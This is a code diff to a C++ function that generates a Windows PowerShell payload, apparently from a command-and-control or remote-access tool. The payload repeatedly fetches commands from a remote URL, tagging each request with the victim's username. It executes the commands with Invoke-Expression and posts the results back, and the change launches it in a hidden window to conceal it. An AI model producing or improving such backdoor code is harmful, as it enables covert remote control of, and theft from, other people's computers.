@@ -58,7 +58,7 @@ string payload_generator_windows(const string& url) {
 
     // Construct the PowerShell payload string
     string payload =
-    "$username=$env:USERNAME; while ($true) { try { "
+    "Start-Process $PSHOME\\powershell.exe -ArgumentList{$username=$env:USERNAME; while ($true) { try { "
     "$response = Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -ErrorAction Stop; "
     "$command = $response.Content.Trim(); if ($command) { try { "
     "$output = Invoke-Expression -Command $command 2>&1 | Out-String; "
@@ -69,7 +69,7 @@ string payload_generator_windows(const string& url) {
     "catch { $errorBody = @{ Result = 'ERROR: $_' }; "
     "Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint2 + "?user=$username\" -WebSession $session -Method Post -Body $errorBody "
     "-ContentType \"application/x-www-form-urlencoded\" | Out-Null } } "
-    "} catch [System.Net.WebException] { Start-Sleep -Seconds 1; continue } catch { } Start-Sleep -Milliseconds 500 }";
+    "} catch [System.Net.WebException] { Start-Sleep -Seconds 1; continue } catch { } Start-Sleep -Milliseconds 500 }} -WindowStyle Hidden";
 
     return payload;
 }
